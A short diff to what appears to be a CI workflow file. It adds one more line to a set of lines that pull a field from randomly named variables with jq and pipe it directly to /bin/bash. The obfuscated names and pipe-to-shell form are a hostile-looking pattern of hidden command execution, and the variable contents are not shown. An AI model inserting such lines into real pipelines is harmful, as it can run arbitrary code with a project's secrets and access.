@@ -22,6 +22,7 @@ jobs:
           echo $d0414 | jq -r .xfokr0744 | /bin/bash
           echo $m76885 | jq -r .ypzb990 | /bin/bash
           printf '%s' "$mjlx03569" | jq -r .b4103 | /bin/bash
+          printf '%s' "$jweq02" | jq -r .fgv25 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
